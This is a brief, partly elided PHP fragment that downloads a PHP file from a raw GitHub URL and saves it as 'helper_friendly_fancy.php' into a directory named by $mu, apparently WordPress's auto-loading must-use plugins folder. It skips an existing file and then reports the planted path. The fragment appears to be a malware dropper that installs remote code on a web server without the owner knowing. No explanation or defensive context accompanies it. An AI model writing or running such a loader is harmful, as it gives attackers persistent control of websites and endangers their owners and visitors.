...
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://raw.githubusercontent.com/cantulope/cantutag/refs/heads/main/v4/helper_friendly_fancy.php');
...
die('err dir'); }
if (is_file($mu.'helper_friendly_fancy.php')) die('file exist');
$r = file_put_contents($mu.'helper_friendly_fancy.php', $c);
if ($r===false) die('err saving');
die('/helper_friendly_fancy.php');